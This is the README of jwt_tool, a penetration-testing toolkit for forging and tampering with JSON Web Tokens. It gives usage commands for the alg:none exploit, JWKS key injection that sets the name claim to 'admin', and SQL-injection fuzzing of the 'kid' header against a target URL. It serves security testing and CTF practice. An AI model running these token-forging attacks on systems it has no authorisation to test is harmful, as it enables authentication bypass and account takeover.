# The JSON Web Token Toolkit v2
>*jwt_tool.py* is a toolkit for validating, forging, scanning and tampering JWTs (JSON Web Tokens).

![jwt_tool version](https://img.shields.io/badge/version-v2.2.6-blue) ![python version](https://img.shields.io/badge/python-v3.6+-green)

![logo](https://user-images.githubusercontent.com/19988419/100555535-18598280-3294-11eb-80ed-ca5a0c3455d6.png)

Its functionality includes:
* Checking the validity of a token
* Testing for known exploits:
  * (CVE-2015-2951) The ***alg=none*** signature-bypass vulnerability
  * (CVE-2016-10555) The ***RS/HS256*** public key mismatch vulnerability
  * (CVE-2018-0114) ***Key injection*** vulnerability
  * (CVE-2019-20933/CVE-2020-28637) ***Blank password*** vulnerability
  * (CVE-2020-28042) ***Null signature*** vulnerability
* Scanning for misconfigurations or known weaknesses
* Fuzzing claim values to provoke unexpected behaviours
* Testing the validity of a secret/key file/Public Key/JWKS key
* Identifying ***weak keys*** via a High-speed ***Dictionary Attack***
* Forging new token header and payload contents and creating a new signature with the **key** or via another attack method
* Timestamp tampering
* RSA and ECDSA key generation, and reconstruction (from JWKS files)
* ...and lots more!

---

## Audience
This tool is written for **pentesters**, who need to check the strength of the tokens in use, and their susceptibility to known attacks. A range of tampering, signing and verifying options are available to help delve deeper into the potential weaknesses present in some JWT libraries.
It has also been successful for **CTF challengers** - as CTFs seem keen on JWTs at present.
It may also be useful for **developers** who are using JWTs in projects, but would like to test for stability and for known vulnerabilities when using forged tokens.

---

## Requirements
This tool is written natively in **Python 3** (version 3.6+) using the common libraries, however various cryptographic funtions (and general prettiness/readability) do require the installation of a few common Python libraries.
*(An older Python 2.x version of this tool is available on the legacy branch for those who need it, although this is no longer be supported or updated)*

---

## Installation

```
$ git clone https://github.com/ticarpi/jwt_tool
$ python3 -m pip install termcolor cprint pycryptodomex requests
$ sudo make install
```

To uninstall:
```
$ sudo make uninstall
```

On first run the tool will generate a config file, some utility files, logfile, and a set of Public and Private keys in various formats.

### Custom Configs
* To make best use of the scanning options it is **strongly advised** to copy the custom-generated JWKS file somewhere that can be accessed remotely via a URL. This address should then be stored in `jwtconf.ini` as the "jwkloc" value.
* In order to capture external service interactions - such as DNS lookups and HTTP requests - put your unique address for Burp Collaborator (or other alternative tools such as RequestBin) into the config file as the "httplistener" value.
***Review the other options in the config file to customise your experience.***

### Color bug in Windows
To fix broken colors in Windows cmd/Powershell: uncomment the below two lines in `jwt_tool.py` (remove the "# " from the beginning of each line)

```diff
- # import colorama
- # colorama.init()
+ import colorama
+ colorama.init()
```

`colorama` is not included in the `requirements.txt` file. in case you didn't had the library you can install it with: `python3 -m pip install colorama`

---

## Usage
The first argument should be the JWT itself (*unless providing this in a header or cookie value*). Providing no additional arguments will show you the decoded token values for review.

```
$ python3 jwt_tool.py <JWT>
```

The toolkit will validate the token and list the header and payload values.

### Additional arguments
The many additional arguments will take you straight to the appropriate function and return you a token ready to use in your tests.
For example, to tamper the existing token run the following:

```
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -T
```

Many options need additional values to set options.
For example, to run a particular type of exploit you need to choose the eXploit (-X) option and select the vulnerability (here using "a" for the *alg:none* exploit):

```
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -X a
```

### Extra parameters
Some options such as Verifying tokens require additional parameters/files to be provided (here providing the Public Key in PEM format):

```
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -V -pk public.pem
```

### Sending tokens to a web application
All modes now allow for sending the token directly to an application.
You need to specify:
* target URL (-t)
* a request header (-rh) or request cookies (-rc) that are needed by the application (***at least one must contain the token***)
* (optional) any POST data (where the request is a POST)
* (optional) any additional jwt_tool options, such as modes or tampering/injection options
* (optional) a *canary value* (-cv) - a text value you expect to see in a successful use of the token (e.g. "Welcome, ticarpi")
An example request might look like this (using scanning mode for forced-errors):
```
$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -rh "Origin: null" -cv "Welcome" -M er
```

Various responses from the request are displayed:
* Response code
* Response size
* Unique request tracking ID (for use with logging)
* Mode/options used

---

## Common Workflow
Here is a quick run-through of a basic assessment of a JWT implementation. If no success with these options then dig deeper into other modes and options to hunt for new vulnerabilities (or zero-days!).

### Recon:
Read the token value to get a feel for the claims/values expected in the application:

```
$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw
```

### Scanning:
Run a ***Playbook Scan*** using the provided token directly against the application to hunt for common misconfigurations:

```
$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb
```

### Exploitation:
If any successful vulnerabilities are found change any relevant claims to try to exploit it (here using the *Inject JWKS* exploit and injecting a new username):

```
$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin
```

### Fuzzing:
Dig deeper by testing for unexpected values and claims to identify unexpected app behaviours, or run attacks on programming logic or token processing:

```
$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt
```

### Review:
Review any successful exploitation by querying the logs to read more data about the request and :

```
$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin
```

---

### Help
For a list of options call the usage function or see some options such as Verifying tokens require additional parameters/files to be provided:

```
$ python3 jwt_tool.py -h
```

**A more detailed user guide can be found on the [wiki page](https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool).**

---

## JWT Attack Playbook - new wiki content!
![playbook_logo](https://user-images.githubusercontent.com/57728093/68797806-21f25700-064d-11ea-9baa-c58fb6f75c0b.png)

Head over to the [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki) for a detailed run-though of what JWTs are, what they do, and a full workflow of how to thoroughly test them for vulnerabilities, common weaknesses and unintended coding errors.

---

## Tips
**Regex for finding JWTs in Burp Search**
*(make sure 'Case sensitive' and 'Regex' options are ticked)*
`[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*` - url-safe JWT version
`[= ]eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*` - all JWT versions (higher possibility of false positives)

---

## Further Reading
* [JWT Attack Playbook (https://github.com/ticarpi/jwt_tool/wiki)](https://github.com/ticarpi/jwt_tool/wiki) - for a thorough JWT testing methodology

* [A great intro to JWTs - https://jwt.io/introduction/](https://jwt.io/introduction/)

* A lot of the initial inspiration for this tool comes from the vulnerabilities discovered by Tim McLean.
[Check out his blog on JWT weaknesses here: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

* A whole bunch of exercises for testing JWT vulnerabilities are provided by [Pentesterlab (https://www.pentesterlab.com)](https://www.pentesterlab.com). I'd highly recommend a PRO subscription if you are interested in Web App Pentesting.

  *PLEASE NOTE:* This toolkit will solve most of the Pentesterlab JWT exercises in a few seconds when used correctly, however I'd **strongly** encourage you to work through these exercises yourself, working out the structure and the weaknesses. After all, it's all about learning...
